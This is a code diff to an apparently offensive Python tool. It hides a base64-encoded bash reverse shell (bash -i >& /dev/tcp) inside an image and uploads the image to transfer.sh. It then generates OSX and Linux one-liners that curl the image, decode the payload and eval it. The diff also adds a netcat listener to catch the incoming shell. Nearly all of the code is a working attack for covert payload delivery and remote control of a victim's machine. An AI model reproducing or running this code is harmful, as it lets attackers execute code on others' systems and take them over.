@@ -5,7 +5,8 @@ from __future__ import absolute_import
 import random
 import string
 import os
-import lib.Cuteit as cit
+import nclib
+import lib.Cuteit as Cit
 
 from PIL import Image
 from termcolor import colored
@@ -15,14 +16,33 @@ from pyfiglet import Figlet
 def listener():
     """Open a netcat listener"""
 
-    print('\n')
-    print(colored("Set up a listener", 'red'))
+    print(colored("Set up listener? (y/n)", 'red'))
+
+    # Asking for valid response
+    while True:
+        response = str(input(""))
+        if not response.isalpha():
+            continue
+        if response == 'y' or response == 'n':
+            break
+
+    if response == 'y':
+        ip = input("Enter ADDRESS to listen on: ")
+        port = int(input("Enter PORT to listen on: "))
+        # open socket listener with nclib
+        print(colored("[*] Listening on: " + str(ip) + ":" + str(port), 'red'))
+        nc = nclib.Netcat(listen=(ip, port))
+        nc.interact()
+        nc.close()
+        print('Bye!')
+        exit(0)
+    else:
+        return
 
 
 def payload_generator(imageurl):
     """Generate oneliner post exploitation command"""
 
-    print('\n')
     print(colored("[1] -> Generate oneliner for OSX", 'red'))
     print(colored("[2] -> Generate oneliner for LINUX", 'red'))
 
@@ -37,13 +57,11 @@ def payload_generator(imageurl):
     # Generate oneliner for OSX
     if int(system) == 1:
         osxpayload = "p=$(curl -s " + imageurl + " | grep Cert -a | sed 's/<[^>]*>//g' |base64 -d);eval $p"
-        print('\n')
         print(colored("[*] OSX payload generated!", 'red'))
         print(osxpayload)
     # Generate oneliner for LINUX
     elif int(system) == 2:
         nixpayload = "p=$(curl -s " + imageurl + " | grep Cert -a | sed 's/<[^>]*>//g' |base64 -i -d);eval $p"
-        print('\n')
         print(colored("[*] Linux payload generated!", 'red'))
         print(nixpayload)
 
@@ -52,8 +70,9 @@ def createpayload(ip, port):
     """Create base64 payload"""
 
     # Rewrite our ip in HEX (https://github.com/D4Vinci/Cuteit)
-    hexip = cit.lib(ip)
-    base64payload = os.popen("printf 'bash -i >& /dev/tcp/" + str(hexip) + "/" + port + " 0>&1' | base64 | tr -d '\n'").read()
+    hexip = Cit.lib(ip)
+    base64payload = os.popen("printf 'bash -i >& /dev/tcp/" + str(hexip.hex) + "/" + port + " 0>&1' | base64 | tr -d "
+                                                                                            "'\n'").read()
 
     return base64payload
 
@@ -68,7 +87,7 @@ def uploadimage(file):
     """Upload image to transfer.sh free hosting service"""
 
     url = os.popen("curl -s --upload-file ./" + file + " https://transfer.sh/" + file).read()
-    print(colored("[+] Image uploaded!", 'red'))
+    print(colored("[*] Image uploaded!", 'red'))
     print(url)
 
     return url
@@ -96,8 +115,9 @@ def main():
     print('\n')
 
     # Ask for ip and port
-    ip = input("Enter IP: ")
-    port = input("Enter port: ")
+    print(colored("Generate Reverse Shell Payload", 'red'))
+    ip = input("Enter IP/HOST: ")
+    port = input("Enter PORT: ")
 
     # Create image
     filename = createimage()
@@ -118,3 +138,4 @@ def main():
 if __name__ == "__main__":
     os.system('clear')
     main()
+    print('Bye!')
